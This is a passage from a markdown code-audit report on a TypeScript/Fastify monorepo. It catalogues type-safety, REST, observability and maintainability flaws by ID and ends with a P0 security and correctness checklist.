- C8 (atomicity) also sits on top — transactions work best when you have rows, not blobs
- C10 (O(n²), no pagination) is partially this cluster — missing indexes are a DB-layer fix
- C11 (stringly-typed) touches this via enums — DB `text` columns should be `enum` types where values are bounded

---

## P2 — Correctness & maintainability

### C11 · Stringly-typed roles / actions / phases

**Root cause:** roles, statuses, meeting types, sprint phases, checklist actions are strings compared with `===` everywhere. No enums, no discriminated unions.

| Domain | Scatter | Flaw IDs |
|---|---|---|
| Agent role (`"ceo"`, `"cto"`, `"developer"`, …) | ~80 sites across 10 files; 8 `if role === X` in a row in [store.ts:79-86](apps/api/src/persistence/store.ts) | F-098, F-244, F-264, F-293, F-312, F-317, F-433 |
| Task kind (`"implementation"`, `"technical_plan"`, `"bug_fix"`, `"follow_up"`) | [specialist-executor.ts](apps/api/src/tasks/specialist-executor.ts), [beat-executor.ts](apps/api/src/heartbeats/beat-executor.ts) | F-334, F-338, F-390 |
| Sprint review phases (`"tester_verification"`, `"cto_escalated"`, `"rework"`, `"final_gate"`) | [review.ts](apps/api/src/sprints/review.ts), [lifecycle.ts](apps/api/src/sprints/lifecycle.ts), [heartbeat-checklist.ts](packages/company-runtime/src/heartbeat-checklist.ts) — accessed via `(sprint as any).reviewState` | F-099, F-239, F-354, F-356 |
| Checklist suggested actions (`"sprint_review:cto_escalation_review"`, `"meeting_contribution:<id>"`, `"skills_lead:mutate_underperformer"`) | Encoded as colon-strings, parsed by `startsWith` / `split(":")` | F-249, F-251, F-275, F-276, F-286 |
| Meeting types + memory modifications | [effects.ts](apps/api/src/meetings/effects.ts), [recording.ts](apps/api/src/meetings/recording.ts) | F-368, F-294 (hippo), F-297 |

**Fix pattern:** one enum per domain in `@arceus/contracts`; one exhaustive `switch` per dispatch site; delete every `role as any` cast; use discriminated unions for actions (`{ kind: "sprint_review.cto_escalation_review" } | { kind: "meeting_contribution"; meetingId: string }`).

---

### C12 · Type-safety leaks

**Root cause:** the Zod discipline at the module boundary is broken by `as any`, `request.body as { … }`, and `z.record(z.string(), z.unknown())` in the contracts themselves.

| Leak | Example | Flaw IDs |
|---|---|---|
| `request.body as { … }` on 10+ route handlers | No runtime check; Fastify JSON Schema unused | F-426 |
| `(roleTools as any)[k]` bypass on governance filter | F-255 inherits the type gap | F-257 |
| `body.role as any` / `body.kind as any` in governance + heartbeat routes | Typos pass through | F-433, F-453 |
| Contracts events use `z.record(z.string(), z.unknown())` for known-shape payloads | `Task`, `Sprint`, `Meeting`, `ChatMessage` carry **zero** runtime validation | F-031 family |
| `null as unknown as GraphNode` bypass in graph emitter | Disguises an invariant violation | F-397 |
| Multiple `as Task["status"] / ["priority"] / ["assignedRole"]` casts in meeting resolution | LLM output mistyped silently | F-365, F-386 |
| Opencode `Record<string, any>` event shape | Every SSE field is `any` downstream | F-296, F-297 |

**Fix pattern:** Fastify `route.schema.body` + Zod parsers at every HTTP boundary; tighten contracts event schemas to reference `TaskSchema` etc.; delete every `as any` with a lint rule forbidding it.

---

### C13 · REST anti-patterns

**Root cause:** routes grew organically; no API spec; no versioning; inconsistent envelopes.

| Anti-pattern | Example | Flaw IDs |
|---|---|---|
| HTTP 200 with `{ error: "…" }` on not-found / conflict | 6 routes | F-425, F-457, F-435 |
| Verbs in URLs | `/api/quick-execute`, `/api/patterns/sweep`, `/api/skills/mutations/:id/run-ata`, `/api/workspace/sync`, `/api/hippocampus/seed` | F-430 |
| Response envelope varies | Bare object vs `{ skills, total }` vs bare array | F-431 |
| Mutation in GET — `seedExistingSkills()` called from 6 GETs | Breaks idempotency assumption | F-427 |
| `parseInt(limit)` no NaN/range/negative handling | 5 routes | F-434 |
| `body.action ?? "approved"` silently defaults a destructive flag | `/api/approvals/:id/resolve` | F-438 |
| SSE streams without heartbeats or subscriber cleanup | `/api/events`, `/api/audit/stream`, `/api/debug/graph/stream` | F-442, F-449 |
| `POST /api/company/bootstrap` 201 without `Location` header | | F-436 |
| No `/api/v1/`; no rate limits; no `OPTIONS` / CORS plugin | Global | F-440, F-455, F-456 |
| Magic Zod defaults injected into audit/git | `agentRole: z.string().default("system")` | F-443 |

**Fix pattern:** one envelope (`{ data, meta?, links? }`); mount under `/api/v1/`; install `@fastify/rate-limit` + `@fastify/cors` + `@fastify/auth`; introduce a `respond()` helper that sets status codes consistently; forbid side effects in GET via naming convention.

---

### C14 · God files & god functions

**Root cause:** SRP drift. Files that should be ~200 LOC are 600-900 with imports from 20+ modules.

| File | LOC | Worst function | Flaw IDs |
|---|---|---|---|
| [server.ts](apps/api/src/server.ts) | ~900 | Route wiring + bootstrap + shutdown in one place | F-003, F-005 |
| [ceo.ts](apps/api/src/agents/ceo.ts) | 626 | schema + summarize + classify + strategy + fallback | F-322 |
| [heartbeat.ts](packages/company-runtime/src/heartbeat.ts) | 733 | `fourPhaseExecutor` = 214 lines | F-203 |
| [review.ts](apps/api/src/sprints/review.ts) | 810 | `executeSprintReviewVerification` = 424 lines | F-352 |
| [proposals.ts](apps/api/src/sprints/proposals.ts) | 428 | `approveSprintProposal` = 215 lines | F-353 |
| [evolution.ts](apps/api/src/skills/evolution.ts) | 544 | 8 inline prompt builders + pipeline wiring | F-342 |
| [mutations.ts](apps/api/src/tasks/mutations.ts) | 414 | `setTaskStatus` = 200 lines of side effects | F-376 |
| [beat-executor.ts](apps/api/src/heartbeats/beat-executor.ts) | 392 | 40+ `emitEmployeeActivity` sites, imports from 18 modules | F-271, F-272 |
| [meeting-scheduler.ts](packages/company-runtime/src/meeting-scheduler.ts) | 438 | tick + assess + escalation + daily-sync + manager chain | F-370 |
| [graph-emitter.ts](apps/api/src/observability/graph-emitter.ts) + [graph-store.ts](apps/api/src/observability/graph-store.ts) | 484 + 405 | Unbounded growth + graph-emit from everywhere | F-393 |
| [pgvector.ts](packages/hippocampus/src/backends/pgvector.ts) | 490 | Duplicate embedding fallback pattern × 4 | F-409 |

**Duplicate execution-cycle modules:** [apps/api/src/orchestration/execution-cycle.ts](apps/api/src/orchestration/execution-cycle.ts) vs [packages/task-engine/src/execution-cycle.ts](packages/task-engine/src/execution-cycle.ts) — two files, overlapping names, overlapping responsibilities. F-387.

**Fix pattern:** split by phase (wake/plan/act/serialize for heartbeat, phase-per-file for review), extract role-specific sub-executors, move the 8 skill-evolution prompts into templates. The F-043 / F-069 / F-089 / F-144 umbrella refactors already track this.

---

### C15 · Observability gaps

**Root cause:** telemetry is dense-but-ad-hoc. Every emit picks its own shape; several decisions leave no trail; truncations silently drop context.

| Gap | Sites | Flaw IDs |
|---|---|---|
| `console.log/warn/error` in prod paths | ~30 sites across skills, sprints, hippocampus, heartbeat, CEO | F-037, F-237, F-323, F-343, F-402 |
| Truncation without `…` marker — `.slice(0, 500)` / `300` / `1500` / `180` / `200` / `6000` | Outputs, errors, artifacts, bash commands, artifact budgets, summaries | F-094, F-268, F-303, F-355, F-382, F-400, F-418 |
| No audit trail on checklist decisions — which checks ran, which resolved, which was selected | [runChecklist](packages/company-runtime/src/heartbeat-checklist.ts:532) | F-248 |
| `/api/events` + `/api/audit/stream` — bare SSE without heartbeats | LBs idle-kill after 30s | F-442, F-449 |
| Audit ledger uses `console.log` for its own errors | Observability dogfood violation | F-402 |
| Hippocampus habit GC flips inactive silently | No audit | F-423 |
| OpenCode SSE parse failures dropped with no counter | Disappear without trace | F-300 |
| No correlation-id on errors returned to clients | Operators can't join client report ↔ server log | F-429 |

**Fix pattern:** a structured logger (pino/winston) passed as a dep; `truncateTelemetry(s, opts)` helper replaces every `.slice(0, N)`; `emitChecklistEvaluated` records the full evaluation trail; every error response carries a `X-Request-Id`.

---

## P3 — Cleanup

### C16 · Dead code & deprecated exports

| Surface | Flaw IDs |
|---|---|
| `executionMode === "orchestrator"` dead branch in heartbeat | F-234 |
| `buildSkillMenu`, `getSkillBody` (catalog.ts), `runPatternPromotionSweep` (cross-sprint.ts) marked `@deprecated` but still exported | F-341 |
| `alternatives: string[]` on DecisionEntry — never populated | F-404 |
| `beatNode.toolCalls` — declared, never populated | F-405 |
| `mapTaskPriority` — identity function | F-389 |
| `scopeBoost` always 1.0 in retrieval | F-421 |
| `__embedding` stash + immediate delete in MMR | F-422 |
| `if (autoSkipOnNoPackageJson) return result; // else fall through` — else path unreachable | F-358 |

**Fix pattern:** straight delete; rename/remove fields; grep-first to confirm no external consumer; one PR.

---

### C17 · Magic constants

~40+ sites where a number or threshold should be a named constant or injected config.

| Family | Examples | Flaw IDs |
|---|---|---|
| Timeouts | `ESCALATION_TIMEOUT_MS`, `10 * 60 * 1000` stale threshold, `3000` reconnect delay, `45000` spawn timeout | F-242, F-265, F-302 |
| Slice windows | `-50`, `500`, `300`, `1500`, `180`, `6000`, `8000`, `100` | F-094 umbrella |
| Thresholds | `0.6` underperformer rate, `0.9` budget ratio, `30` stale days, `3` cluster min, `384` embedding dim | F-242, F-250, F-281, F-413 |
| Caps | `slice(0, 3)`, `slice(0, 2)`, `slice(0, 20)` artifacts, `slice(0, 10)` evolution | F-288, F-381, F-417 |
| Role name map `role → display name` | 8 consecutive `if (role === X) return "…"` | F-244, F-264 |

**Fix pattern:** central `config.ts` per domain (`ChecklistConfig`, `SkillsLeadPolicy`, `BudgetPolicy`, `WorkspaceConfig`); inject as dep.

---

## File hotspot heat map

Density = flaws per file. Top offenders (each has ≥15 findings in flaws.md):

```
mutations.ts          (F-143+30 pers + F-374+17 tasks)  ████████████  47
heartbeat.ts          (F-203-237)                       █████████     35
meeting-scheduler.ts  (F-359-373 in scheduler cluster)  ████████      32
review.ts             (F-345-352 + cluster)             ██████        25
beat-executor.ts      (F-255-273)                       █████         19
skill-* (registry/mutator/tester/evolution)             █████         19
hippocampus (pgvector + service + extractors)           █████         18
server.ts             (F-001-042)                       █████████     42
control-plane.ts      (F-086-117)                       █████████     32
routes/*              (F-424-458)                       ████████      35
```

See [flaws.md "Files covered so far"](./flaws.md) for the full per-file count.

---

## One-sprint P0 sweep — what "done" looks like

- [ ] C2: `swallowAndAudit` helper + lint rule; every bare catch is gone.
- [ ] C1: `applyMutations` executes compound `UPDATE … WHERE version = ?`; two concurrent beats for the same task test reliably rejects one with 409.
- [ ] C4: `GOVERNANCE_ENABLED = true`; all mutation routes behind `preHandler` auth; `NODE_ENV !== "production"` gate on `/api/debug/*`, `/api/hippocampus/seed`, `/api/skills/simulate-task-outcome`.
- [ ] C5: `spawn(argv, { shell: false })` everywhere; AST-level skill lint; pgvector habit query fully parameterized.
- [ ] C3: `runATAPipeline`, `processTaskCompletion`, `cpUpdateTrustScore` enqueued to a durable job queue; drain worker with retry metadata.

Ship this and the audit drops from 458 → ~330 findings, and production is not one `curl` from a reset.
